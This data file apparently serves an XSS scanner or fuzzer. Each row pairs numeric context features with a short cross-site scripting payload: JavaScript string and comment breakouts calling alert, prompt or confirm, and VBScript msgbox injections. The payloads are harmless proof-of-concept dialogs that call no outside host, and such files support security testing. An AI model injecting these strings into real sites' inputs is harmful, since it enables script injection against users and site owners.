3,2,3,0,2,1,0,1,1,1,0,0,0,0,0,0,0,60,['; alert(); //]
3,2,3,0,2,0,0,1,1,1,0,0,0,0,0,0,0,60,['; alert(); //]
3,2,3,0,2,0,0,0,1,1,0,0,0,0,0,0,0,60,['; alert(); //]
3,2,3,0,2,0,0,0,1,1,0,0,0,0,0,0,0,60,['; alert(); //]
3,2,3,0,2,0,0,0,1,1,0,0,0,0,0,0,0,60,['; alert(); //]
3,2,3,0,2,0,0,0,1,1,0,0,0,0,0,0,0,60,['; alert(); //]
3,2,3,0,2,0,0,0,1,1,0,0,0,0,0,0,0,60,['; alert(); //]
3,2,3,0,2,0,0,0,1,1,0,0,0,0,0,0,0,60,['; alert(); //]
3,2,3,0,2,0,0,0,1,1,1,0,0,0,0,0,0,61,['; prompt(); //]
3,2,3,0,2,1,0,0,1,1,1,0,0,0,0,0,0,61,['; prompt(); //]
3,2,3,0,2,1,0,1,1,1,1,0,0,0,0,0,0,61,['; prompt(); //]
3,2,3,0,2,0,0,1,1,1,1,0,0,0,0,0,0,61,['; prompt(); //]
3,2,3,0,2,0,0,0,1,1,1,0,0,0,0,0,0,61,['; prompt(); //]
3,2,3,0,2,0,0,0,1,1,1,0,0,0,0,0,0,61,['; prompt(); //]
3,2,3,0,2,0,0,0,1,1,1,0,0,0,0,0,0,61,['; prompt(); //]
3,2,3,0,2,0,0,0,1,1,1,0,0,0,0,0,0,61,['; prompt(); //]
3,2,3,0,2,0,0,0,1,1,1,0,0,0,0,0,0,61,['; prompt(); //]
3,2,3,0,2,0,0,0,1,1,1,0,0,0,0,0,0,61,['; prompt(); //]
3,2,3,0,2,0,0,0,1,1,1,1,0,0,0,0,0,62,['; confirm(); //]
3,2,3,0,2,1,0,0,1,1,1,1,0,0,0,0,0,62,['; confirm(); //]
3,2,3,0,2,1,0,1,1,1,1,1,0,0,0,0,0,62,['; confirm(); //]
3,2,3,0,2,0,0,1,1,1,1,1,0,0,0,0,0,62,['; confirm(); //]
3,2,3,0,2,0,0,0,1,1,1,1,0,0,0,0,0,62,['; confirm(); //]
3,2,3,0,2,0,0,0,1,1,1,1,0,0,0,0,0,62,['; confirm(); //]
3,2,3,0,2,0,0,0,1,1,1,1,0,0,0,0,0,62,['; confirm(); //]
3,2,3,0,2,0,0,0,1,1,1,1,0,0,0,0,0,62,['; confirm(); //]
3,2,3,0,2,0,0,0,1,1,1,1,0,0,0,0,0,62,['; confirm(); //]
3,2,3,0,2,0,0,0,1,1,1,1,0,0,0,0,0,62,['; confirm(); //]
3,2,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,63,['; alert``; //]
3,2,3,0,2,1,0,0,1,1,1,1,1,0,0,0,0,63,['; alert``; //]
3,2,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,63,['; alert``; //]
3,2,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,63,['; alert``; //]
3,2,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,63,['; alert``; //]
3,2,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,63,['; alert``; //]
3,2,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,63,['; alert``; //]
3,2,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,63,['; alert``; //]
3,2,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,63,['; alert``; //]
3,2,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,63,['; alert``; //]
3,2,3,0,0,0,0,0,1,1,0,0,0,0,0,0,0,64,[; alert()[; //]
3,2,3,0,0,1,0,0,1,1,0,0,0,0,0,0,0,64,[; alert()[; //]
3,2,3,0,0,1,1,0,1,1,0,0,0,0,0,0,0,64,[; alert()[; //]
3,2,3,0,0,0,1,0,1,1,0,0,0,0,0,0,0,64,[; alert()[; //]
3,2,3,0,0,0,1,1,1,1,0,0,0,0,0,0,0,64,[; alert()[; //]
3,2,3,0,0,0,0,1,1,1,0,0,0,0,0,0,0,64,[; alert()[; //]
3,2,3,0,0,1,0,1,1,1,0,0,0,0,0,0,0,64,[; alert()[; //]
3,2,3,0,0,1,1,1,1,1,0,0,0,0,0,0,0,64,[; alert()[; //]
3,2,3,0,0,0,0,0,1,1,0,0,0,0,0,0,0,64,[; alert()[; //]
3,2,3,0,0,0,0,0,1,1,0,0,0,0,0,0,0,64,[; alert()[; //]
3,2,3,0,0,0,0,0,1,1,1,0,0,0,0,0,0,65,[; prompt()[; //]
3,2,3,0,0,1,0,0,1,1,1,0,0,0,0,0,0,65,[; prompt()[; //]
3,2,3,0,0,1,1,0,1,1,1,0,0,0,0,0,0,65,[; prompt()[; //]
3,2,3,0,0,0,1,0,1,1,1,0,0,0,0,0,0,65,[; prompt()[; //]
3,2,3,0,0,0,1,1,1,1,1,0,0,0,0,0,0,65,[; prompt()[; //]
3,2,3,0,0,0,0,1,1,1,1,0,0,0,0,0,0,65,[; prompt()[; //]
3,2,3,0,0,1,0,1,1,1,1,0,0,0,0,0,0,65,[; prompt()[; //]
3,2,3,0,0,1,1,1,1,1,1,0,0,0,0,0,0,65,[; prompt()[; //]
3,2,3,0,0,0,0,0,1,1,1,0,0,0,0,0,0,65,[; prompt()[; //]
3,2,3,0,0,0,0,0,1,1,1,0,0,0,0,0,0,65,[; prompt()[; //]
3,2,3,0,0,0,0,0,1,1,1,1,0,0,0,0,0,66,[; confirm()[; //]
3,2,3,0,0,1,0,0,1,1,1,1,0,0,0,0,0,66,[; confirm()[; //]
3,2,3,0,0,1,1,0,1,1,1,1,0,0,0,0,0,66,[; confirm()[; //]
3,2,3,0,0,0,1,0,1,1,1,1,0,0,0,0,0,66,[; confirm()[; //]
3,2,3,0,0,0,1,1,1,1,1,1,0,0,0,0,0,66,[; confirm()[; //]
3,2,3,0,0,0,0,1,1,1,1,1,0,0,0,0,0,66,[; confirm()[; //]
3,2,3,0,0,1,0,1,1,1,1,1,0,0,0,0,0,66,[; confirm()[; //]
3,2,3,0,0,1,1,1,1,1,1,1,0,0,0,0,0,66,[; confirm()[; //]
3,2,3,0,0,0,0,0,1,1,1,1,0,0,0,0,0,66,[; confirm()[; //]
3,2,3,0,0,0,0,0,1,1,1,1,0,0,0,0,0,66,[; confirm()[; //]
3,2,3,0,0,0,0,0,1,1,1,1,1,0,0,0,0,67,[; alert``[; //]
3,2,3,0,0,1,0,0,1,1,1,1,1,0,0,0,0,67,[; alert``[; //]
3,2,3,0,0,1,1,0,1,1,1,1,1,0,0,0,0,67,[; alert``[; //]
3,2,3,0,0,0,1,0,1,1,1,1,1,0,0,0,0,67,[; alert``[; //]
3,2,3,0,0,0,0,0,1,1,1,1,1,0,0,0,0,67,[; alert``[; //]
3,2,3,0,0,0,0,0,1,1,1,1,1,0,0,0,0,67,[; alert``[; //]
3,2,3,0,0,0,0,0,1,1,1,1,1,0,0,0,0,67,[; alert``[; //]
3,2,3,0,0,0,0,0,1,1,1,1,1,0,0,0,0,67,[; alert``[; //]
3,2,3,0,0,0,0,0,1,1,1,1,1,0,0,0,0,67,[; alert``[; //]
3,2,3,0,0,0,0,0,1,1,1,1,1,0,0,0,0,67,[; alert``[; //]
3,2,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,68,"["" & msgbox(""exploit"") & ""aa]"
3,2,0,1,1,0,1,0,1,1,0,0,0,0,0,0,0,68,"["" & msgbox(""exploit"") & ""aa]"
3,2,0,1,1,0,1,1,1,1,0,0,0,0,0,0,0,68,"["" & msgbox(""exploit"") & ""aa]"
3,2,0,1,1,0,0,1,1,1,0,0,0,0,0,0,0,68,"["" & msgbox(""exploit"") & ""aa]"
3,2,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,68,"["" & msgbox(""exploit"") & ""aa]"
3,2,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,68,"["" & msgbox(""exploit"") & ""aa]"
3,2,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,68,"["" & msgbox(""exploit"") & ""aa]"
3,2,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,68,"["" & msgbox(""exploit"") & ""aa]"
3,2,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,68,"["" & msgbox(""exploit"") & ""aa]"
3,2,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,68,"["" & msgbox(""exploit"") & ""aa]"
3,2,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,69,[msgbox()]
3,2,0,1,0,1,0,0,1,1,0,0,0,0,0,0,0,69,[msgbox()]
3,2,0,1,0,1,1,0,1,1,0,0,0,0,0,0,0,69,[msgbox()]
3,2,0,1,0,0,1,0,1,1,0,0,0,0,0,0,0,69,[msgbox()]
3,2,0,1,0,0,1,1,1,1,0,0,0,0,0,0,0,69,[msgbox()]
3,2,0,1,0,0,0,1,1,1,0,0,0,0,0,0,0,69,[msgbox()]
3,2,0,1,0,1,0,1,1,1,0,0,0,0,0,0,0,69,[msgbox()]
3,2,0,1,0,1,1,1,1,1,0,0,0,0,0,0,0,69,[msgbox()]
3,2,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,69,[msgbox()]
3,2,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,69,[msgbox()]
0,0,3,0,1,0,0,0,1,1,0,0,0,0,0,0,0,70,"["";\r\nalert();//]"
0,0,3,0,1,0,1,0,1,1,0,0,0,0,0,0,0,70,"["";\r\nalert();//]"
0,0,3,0,1,0,1,1,1,1,0,0,0,0,0,0,0,70,"["";\r\nalert();//]"
0,0,3,0,1,0,0,1,1,1,0,0,0,0,0,0,0,70,"["";\r\nalert();//]"
0,0,3,0,1,0,0,0,1,1,0,0,0,0,0,0,0,70,"["";\r\nalert();//]"
0,0,3,0,1,0,0,0,1,1,0,0,0,0,0,0,0,70,"["";\r\nalert();//]"
0,0,3,0,1,0,0,0,1,1,0,0,0,0,0,0,0,70,"["";\r\nalert();//]"
0,0,3,0,1,0,0,0,1,1,0,0,0,0,0,0,0,70,"["";\r\nalert();//]"
0,0,3,0,1,0,0,0,1,1,0,0,0,0,0,0,0,70,"["";\r\nalert();//]"
0,0,3,0,1,0,0,0,1,1,0,0,0,0,0,0,0,70,"["";\r\nalert();//]"
0,0,3,0,1,0,0,0,1,1,1,0,0,0,0,0,0,71,"["";\r\nprompt();//]"
0,0,3,0,1,0,1,0,1,1,1,0,0,0,0,0,0,71,"["";\r\nprompt();//]"
0,0,3,0,1,0,1,1,1,1,1,0,0,0,0,0,0,71,"["";\r\nprompt();//]"
0,0,3,0,1,0,0,1,1,1,1,0,0,0,0,0,0,71,"["";\r\nprompt();//]"
0,0,3,0,1,0,0,0,1,1,1,0,0,0,0,0,0,71,"["";\r\nprompt();//]"
0,0,3,0,1,0,0,0,1,1,1,0,0,0,0,0,0,71,"["";\r\nprompt();//]"
0,0,3,0,1,0,0,0,1,1,1,0,0,0,0,0,0,71,"["";\r\nprompt();//]"
0,0,3,0,1,0,0,0,1,1,1,0,0,0,0,0,0,71,"["";\r\nprompt();//]"
0,0,3,0,1,0,0,0,1,1,1,0,0,0,0,0,0,71,"["";\r\nprompt();//]"
0,0,3,0,1,0,0,0,1,1,1,0,0,0,0,0,0,71,"["";\r\nprompt();//]"
0,0,3,0,1,0,0,0,1,1,1,1,0,0,0,0,0,72,"["";\r\nconfirm();//]"
0,0,3,0,1,0,1,0,1,1,1,1,0,0,0,0,0,72,"["";\r\nconfirm();//]"
0,0,3,0,1,0,1,1,1,1,1,1,0,0,0,0,0,72,"["";\r\nconfirm();//]"
0,0,3,0,1,0,0,1,1,1,1,1,0,0,0,0,0,72,"["";\r\nconfirm();//]"
0,0,3,0,1,0,0,0,1,1,1,1,0,0,0,0,0,72,"["";\r\nconfirm();//]"
0,0,3,0,1,0,0,0,1,1,1,1,0,0,0,0,0,72,"["";\r\nconfirm();//]"
0,0,3,0,1,0,0,0,1,1,1,1,0,0,0,0,0,72,"["";\r\nconfirm();//]"
0,0,3,0,1,0,0,0,1,1,1,1,0,0,0,0,0,72,"["";\r\nconfirm();//]"
0,0,3,0,1,0,0,0,1,1,1,1,0,0,0,0,0,72,"["";\r\nconfirm();//]"
0,0,3,0,1,0,0,0,1,1,1,1,0,0,0,0,0,72,"["";\r\nconfirm();//]"
0,0,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,73,"["";\r\nalert``;//]"
0,0,3,0,1,0,1,0,1,1,1,1,1,0,0,0,0,73,"["";\r\nalert``;//]"
0,0,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,73,"["";\r\nalert``;//]"
0,0,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,73,"["";\r\nalert``;//]"
0,0,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,73,"["";\r\nalert``;//]"
0,0,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,73,"["";\r\nalert``;//]"
0,0,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,73,"["";\r\nalert``;//]"
0,0,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,73,"["";\r\nalert``;//]"
0,0,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,73,"["";\r\nalert``;//]"
0,0,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,73,"["";\r\nalert``;//]"
0,0,3,0,2,0,0,0,1,1,0,0,0,0,0,0,0,74,[';\r\nalert();//]
0,0,3,0,2,1,0,0,1,1,0,0,0,0,0,0,0,74,[';\r\nalert();//]
0,0,3,0,2,1,0,1,1,1,0,0,0,0,0,0,0,74,[';\r\nalert();//]
0,0,3,0,2,0,0,1,1,1,0,0,0,0,0,0,0,74,[';\r\nalert();//]
0,0,3,0,2,0,0,0,1,1,0,0,0,0,0,0,0,74,[';\r\nalert();//]
0,0,3,0,2,0,0,0,1,1,0,0,0,0,0,0,0,74,[';\r\nalert();//]
0,0,3,0,2,0,0,0,1,1,0,0,0,0,0,0,0,74,[';\r\nalert();//]
0,0,3,0,2,0,0,0,1,1,0,0,0,0,0,0,0,74,[';\r\nalert();//]
0,0,3,0,2,0,0,0,1,1,0,0,0,0,0,0,0,74,[';\r\nalert();//]
0,0,3,0,2,0,0,0,1,1,0,0,0,0,0,0,0,74,[';\r\nalert();//]
0,0,3,0,2,0,0,0,1,1,1,0,0,0,0,0,0,75,[';\r\nprompt();//]
0,0,3,0,2,1,0,0,1,1,1,0,0,0,0,0,0,75,[';\r\nprompt();//]
0,0,3,0,2,1,0,1,1,1,1,0,0,0,0,0,0,75,[';\r\nprompt();//]
0,0,3,0,2,0,0,1,1,1,1,0,0,0,0,0,0,75,[';\r\nprompt();//]
0,0,3,0,2,0,0,0,1,1,1,0,0,0,0,0,0,75,[';\r\nprompt();//]
0,0,3,0,2,0,0,0,1,1,1,0,0,0,0,0,0,75,[';\r\nprompt();//]
0,0,3,0,2,0,0,0,1,1,1,0,0,0,0,0,0,75,[';\r\nprompt();//]
0,0,3,0,2,0,0,0,1,1,1,0,0,0,0,0,0,75,[';\r\nprompt();//]
0,0,3,0,2,0,0,0,1,1,1,0,0,0,0,0,0,75,[';\r\nprompt();//]
0,0,3,0,2,0,0,0,1,1,1,0,0,0,0,0,0,75,[';\r\nprompt();//]
0,0,3,0,2,0,0,0,1,1,1,1,0,0,0,0,0,76,[';\r\nconfirm();//]
0,0,3,0,2,1,0,0,1,1,1,1,0,0,0,0,0,76,[';\r\nconfirm();//]
0,0,3,0,2,1,0,1,1,1,1,1,0,0,0,0,0,76,[';\r\nconfirm();//]
0,0,3,0,2,0,0,1,1,1,1,1,0,0,0,0,0,76,[';\r\nconfirm();//]
0,0,3,0,2,0,0,0,1,1,1,1,0,0,0,0,0,76,[';\r\nconfirm();//]
0,0,3,0,2,0,0,0,1,1,1,1,0,0,0,0,0,76,[';\r\nconfirm();//]
0,0,3,0,2,0,0,0,1,1,1,1,0,0,0,0,0,76,[';\r\nconfirm();//]
0,0,3,0,2,0,0,0,1,1,1,1,0,0,0,0,0,76,[';\r\nconfirm();//]
0,0,3,0,2,0,0,0,1,1,1,1,0,0,0,0,0,76,[';\r\nconfirm();//]
0,0,3,0,2,0,0,0,1,1,1,1,0,0,0,0,0,76,[';\r\nconfirm();//]
0,0,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,77,[';\r\nalert``;//]
0,0,3,0,2,1,0,0,1,1,1,1,1,0,0,0,0,77,[';\r\nalert``;//]
0,0,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,77,[';\r\nalert``;//]
0,0,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,77,[';\r\nalert``;//]
0,0,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,77,[';\r\nalert``;//]
0,0,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,77,[';\r\nalert``;//]
0,0,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,77,[';\r\nalert``;//]
0,0,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,77,[';\r\nalert``;//]
0,0,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,77,[';\r\nalert``;//]
0,0,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,77,[';\r\nalert``;//]
0,0,3,0,0,0,0,0,1,1,0,0,0,0,0,0,0,78,[;\r\nalert();//]
0,0,3,0,0,1,0,0,1,1,0,0,0,0,0,0,0,78,[;\r\nalert();//]
0,0,3,0,0,1,1,0,1,1,0,0,0,0,0,0,0,78,[;\r\nalert();//]
0,0,3,0,0,0,1,0,1,1,0,0,0,0,0,0,0,78,[;\r\nalert();//]
0,0,3,0,0,0,1,1,1,1,0,0,0,0,0,0,0,78,[;\r\nalert();//]
0,0,3,0,0,0,0,1,1,1,0,0,0,0,0,0,0,78,[;\r\nalert();//]
0,0,3,0,0,1,0,1,1,1,0,0,0,0,0,0,0,78,[;\r\nalert();//]
0,0,3,0,0,1,1,1,1,1,0,0,0,0,0,0,0,78,[;\r\nalert();//]
0,0,3,0,0,0,0,0,1,1,0,0,0,0,0,0,0,78,[;\r\nalert();//]
0,0,3,0,0,0,0,0,1,1,0,0,0,0,0,0,0,78,[;\r\nalert();//]
0,0,3,0,0,0,0,0,1,1,1,0,0,0,0,0,0,79,[;\r\nprompt();//]
0,0,3,0,0,1,0,0,1,1,1,0,0,0,0,0,0,79,[;\r\nprompt();//]
0,0,3,0,0,1,1,0,1,1,1,0,0,0,0,0,0,79,[;\r\nprompt();//]
0,0,3,0,0,0,1,0,1,1,1,0,0,0,0,0,0,79,[;\r\nprompt();//]
0,0,3,0,0,0,1,1,1,1,1,0,0,0,0,0,0,79,[;\r\nprompt();//]
0,0,3,0,0,0,0,1,1,1,1,0,0,0,0,0,0,79,[;\r\nprompt();//]
0,0,3,0,0,1,0,1,1,1,1,0,0,0,0,0,0,79,[;\r\nprompt();//]
0,0,3,0,0,1,1,1,1,1,1,0,0,0,0,0,0,79,[;\r\nprompt();//]
0,0,3,0,0,0,0,0,1,1,1,0,0,0,0,0,0,79,[;\r\nprompt();//]
0,0,3,0,0,0,0,0,1,1,1,0,0,0,0,0,0,79,[;\r\nprompt();//]
0,0,3,0,0,0,0,0,1,1,1,1,0,0,0,0,0,80,[;\r\nconfirm();//]
0,0,3,0,0,1,0,0,1,1,1,1,0,0,0,0,0,80,[;\r\nconfirm();//]
0,0,3,0,0,1,1,0,1,1,1,1,0,0,0,0,0,80,[;\r\nconfirm();//]
0,0,3,0,0,0,1,0,1,1,1,1,0,0,0,0,0,80,[;\r\nconfirm();//]
0,0,3,0,0,0,1,1,1,1,1,1,0,0,0,0,0,80,[;\r\nconfirm();//]
0,0,3,0,0,0,0,1,1,1,1,1,0,0,0,0,0,80,[;\r\nconfirm();//]
0,0,3,0,0,1,0,1,1,1,1,1,0,0,0,0,0,80,[;\r\nconfirm();//]
0,0,3,0,0,1,1,1,1,1,1,1,0,0,0,0,0,80,[;\r\nconfirm();//]
0,0,3,0,0,0,0,0,1,1,1,1,0,0,0,0,0,80,[;\r\nconfirm();//]
0,0,3,0,0,0,0,0,1,1,1,1,0,0,0,0,0,80,[;\r\nconfirm();//]
0,0,3,0,0,0,0,0,1,1,1,1,1,0,0,0,0,81,[;\r\nalert``;//]
0,0,3,0,0,1,0,0,1,1,1,1,1,0,0,0,0,81,[;\r\nalert``;//]
0,0,3,0,0,1,1,0,1,1,1,1,1,0,0,0,0,81,[;\r\nalert``;//]
0,0,3,0,0,0,1,0,1,1,1,1,1,0,0,0,0,81,[;\r\nalert``;//]
0,0,3,0,0,0,0,0,1,1,1,1,1,0,0,0,0,81,[;\r\nalert``;//]
0,0,3,0,0,0,0,0,1,1,1,1,1,0,0,0,0,81,[;\r\nalert``;//]
0,0,3,0,0,0,0,0,1,1,1,1,1,0,0,0,0,81,[;\r\nalert``;//]
0,0,3,0,0,0,0,0,1,1,1,1,1,0,0,0,0,81,[;\r\nalert``;//]
0,0,3,0,0,0,0,0,1,1,1,1,1,0,0,0,0,81,[;\r\nalert``;//]
0,0,3,0,0,0,0,0,1,1,1,1,1,0,0,0,0,81,[;\r\nalert``;//]
0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,82,"[""\r\nmsgbox ""3122]"
0,0,0,1,1,0,1,0,1,1,0,0,0,0,0,0,0,82,"[""\r\nmsgbox ""3122]"
0,0,0,1,1,0,1,1,1,1,0,0,0,0,0,0,0,82,"[""\r\nmsgbox ""3122]"
0,0,0,1,1,0,0,1,1,1,0,0,0,0,0,0,0,82,"[""\r\nmsgbox ""3122]"
0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,82,"[""\r\nmsgbox ""3122]"
0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,82,"[""\r\nmsgbox ""3122]"
0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,82,"[""\r\nmsgbox ""3122]"
0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,82,"[""\r\nmsgbox ""3122]"
0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,82,"[""\r\nmsgbox ""3122]"
0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,82,"[""\r\nmsgbox ""3122]"
0,0,0,1,0,1,1,1,1,1,0,0,0,0,0,0,0,83,[\r\nmsgbox document.domain\r\n]
0,0,0,1,0,1,1,1,1,1,0,0,0,0,0,0,0,83,[\r\nmsgbox document.domain\r\n]
0,0,0,1,0,1,1,1,1,1,0,0,0,0,0,0,0,83,[\r\nmsgbox document.domain\r\n]
0,0,0,1,0,1,1,1,1,1,0,0,0,0,0,0,0,83,[\r\nmsgbox document.domain\r\n]
0,0,0,1,0,1,1,1,1,1,0,0,0,0,0,0,0,83,[\r\nmsgbox document.domain\r\n]
0,0,0,1,0,1,1,1,1,1,0,0,0,0,0,0,0,83,[\r\nmsgbox document.domain\r\n]
0,0,0,1,0,1,1,1,1,1,0,0,0,0,0,0,0,83,[\r\nmsgbox document.domain\r\n]
0,0,0,1,0,1,1,1,1,1,0,0,0,0,0,0,0,83,[\r\nmsgbox document.domain\r\n]
0,0,0,1,0,1,1,1,1,1,0,0,0,0,0,0,0,83,[\r\nmsgbox document.domain\r\n]
0,0,0,1,0,1,1,1,1,1,0,0,0,0,0,0,0,83,[\r\nmsgbox document.domain\r\n]
0,0,2,0,0,0,0,0,1,1,0,0,0,0,0,0,0,84,[\r\nalert();//]
0,0,2,0,0,1,0,0,1,1,0,0,0,0,0,0,0,84,[\r\nalert();//]
0,0,2,0,0,1,1,0,1,1,0,0,0,0,0,0,0,84,[\r\nalert();//]
0,0,2,0,0,0,1,0,1,1,0,0,0,0,0,0,0,84,[\r\nalert();//]
0,0,2,0,0,0,1,1,1,1,0,0,0,0,0,0,0,84,[\r\nalert();//]
0,0,2,0,0,0,0,1,1,1,0,0,0,0,0,0,0,84,[\r\nalert();//]
0,0,2,0,0,1,0,1,1,1,0,0,0,0,0,0,0,84,[\r\nalert();//]
0,0,2,0,0,1,1,1,1,1,0,0,0,0,0,0,0,84,[\r\nalert();//]
0,0,2,0,0,0,0,0,1,1,0,0,0,0,0,0,0,84,[\r\nalert();//]
0,0,2,0,0,0,0,0,1,1,0,0,0,0,0,0,0,84,[\r\nalert();//]
0,0,2,0,0,0,0,0,1,1,1,0,0,0,0,0,0,85,[\r\nprompt();//]
0,0,2,0,0,1,0,0,1,1,1,0,0,0,0,0,0,85,[\r\nprompt();//]
0,0,2,0,0,1,1,0,1,1,1,0,0,0,0,0,0,85,[\r\nprompt();//]
0,0,2,0,0,0,1,0,1,1,1,0,0,0,0,0,0,85,[\r\nprompt();//]
0,0,2,0,0,0,1,1,1,1,1,0,0,0,0,0,0,85,[\r\nprompt();//]
0,0,2,0,0,0,0,1,1,1,1,0,0,0,0,0,0,85,[\r\nprompt();//]
0,0,2,0,0,1,0,1,1,1,1,0,0,0,0,0,0,85,[\r\nprompt();//]
0,0,2,0,0,1,1,1,1,1,1,0,0,0,0,0,0,85,[\r\nprompt();//]
0,0,2,0,0,0,0,0,1,1,1,0,0,0,0,0,0,85,[\r\nprompt();//]
0,0,2,0,0,0,0,0,1,1,1,0,0,0,0,0,0,85,[\r\nprompt();//]
0,0,2,0,0,0,0,0,1,1,1,1,0,0,0,0,0,86,[\r\nconfirm();//]
0,0,2,0,0,1,0,0,1,1,1,1,0,0,0,0,0,86,[\r\nconfirm();//]
0,0,2,0,0,1,1,0,1,1,1,1,0,0,0,0,0,86,[\r\nconfirm();//]
0,0,2,0,0,0,1,0,1,1,1,1,0,0,0,0,0,86,[\r\nconfirm();//]
0,0,2,0,0,0,1,1,1,1,1,1,0,0,0,0,0,86,[\r\nconfirm();//]
0,0,2,0,0,0,0,1,1,1,1,1,0,0,0,0,0,86,[\r\nconfirm();//]
0,0,2,0,0,1,0,1,1,1,1,1,0,0,0,0,0,86,[\r\nconfirm();//]
0,0,2,0,0,1,1,1,1,1,1,1,0,0,0,0,0,86,[\r\nconfirm();//]
0,0,2,0,0,0,0,0,1,1,1,1,0,0,0,0,0,86,[\r\nconfirm();//]
0,0,2,0,0,0,0,0,1,1,1,1,0,0,0,0,0,86,[\r\nconfirm();//]
0,0,2,0,0,0,0,0,1,1,1,1,1,0,0,0,0,87,[\r\nalert``;//]
0,0,2,0,0,1,0,0,1,1,1,1,1,0,0,0,0,87,[\r\nalert``;//]
0,0,2,0,0,1,1,0,1,1,1,1,1,0,0,0,0,87,[\r\nalert``;//]
0,0,2,0,0,0,1,0,1,1,1,1,1,0,0,0,0,87,[\r\nalert``;//]
0,0,2,0,0,0,0,0,1,1,1,1,1,0,0,0,0,87,[\r\nalert``;//]
0,0,2,0,0,0,0,0,1,1,1,1,1,0,0,0,0,87,[\r\nalert``;//]
0,0,2,0,0,0,0,0,1,1,1,1,1,0,0,0,0,87,[\r\nalert``;//]
0,0,2,0,0,0,0,0,1,1,1,1,1,0,0,0,0,87,[\r\nalert``;//]
0,0,2,0,0,0,0,0,1,1,1,1,1,0,0,0,0,87,[\r\nalert``;//]
0,0,2,0,0,0,0,0,1,1,1,1,1,0,0,0,0,87,[\r\nalert``;//]
0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,88,[*/\r\nalert();//]
0,0,1,0,0,1,0,0,1,1,0,0,0,0,0,0,0,88,[*/\r\nalert();//]
0,0,1,0,0,1,1,0,1,1,0,0,0,0,0,0,0,88,[*/\r\nalert();//]
0,0,1,0,0,0,1,0,1,1,0,0,0,0,0,0,0,88,[*/\r\nalert();//]
0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,0,0,88,[*/\r\nalert();//]
0,0,1,0,0,0,0,1,1,1,0,0,0,0,0,0,0,88,[*/\r\nalert();//]
0,0,1,0,0,1,0,1,1,1,0,0,0,0,0,0,0,88,[*/\r\nalert();//]
0,0,1,0,0,1,1,1,1,1,0,0,0,0,0,0,0,88,[*/\r\nalert();//]
0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,88,[*/\r\nalert();//]
0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,88,[*/\r\nalert();//]
0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,0,0,89,[*/\r\nprompt();//]
0,0,1,0,0,1,0,0,1,1,1,0,0,0,0,0,0,89,[*/\r\nprompt();//]
0,0,1,0,0,1,1,0,1,1,1,0,0,0,0,0,0,89,[*/\r\nprompt();//]
0,0,1,0,0,0,1,0,1,1,1,0,0,0,0,0,0,89,[*/\r\nprompt();//]
0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,0,0,89,[*/\r\nprompt();//]
0,0,1,0,0,0,0,1,1,1,1,0,0,0,0,0,0,89,[*/\r\nprompt();//]
0,0,1,0,0,1,0,1,1,1,1,0,0,0,0,0,0,89,[*/\r\nprompt();//]
0,0,1,0,0,1,1,1,1,1,1,0,0,0,0,0,0,89,[*/\r\nprompt();//]
0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,0,0,89,[*/\r\nprompt();//]
0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,0,0,89,[*/\r\nprompt();//]
0,0,1,0,0,0,0,0,1,1,1,1,0,0,0,0,0,90,[*/\r\nconfirm();//]
0,0,1,0,0,1,0,0,1,1,1,1,0,0,0,0,0,90,[*/\r\nconfirm();//]
0,0,1,0,0,1,1,0,1,1,1,1,0,0,0,0,0,90,[*/\r\nconfirm();//]
0,0,1,0,0,0,1,0,1,1,1,1,0,0,0,0,0,90,[*/\r\nconfirm();//]
0,0,1,0,0,0,1,1,1,1,1,1,0,0,0,0,0,90,[*/\r\nconfirm();//]
0,0,1,0,0,0,0,1,1,1,1,1,0,0,0,0,0,90,[*/\r\nconfirm();//]
0,0,1,0,0,1,0,1,1,1,1,1,0,0,0,0,0,90,[*/\r\nconfirm();//]
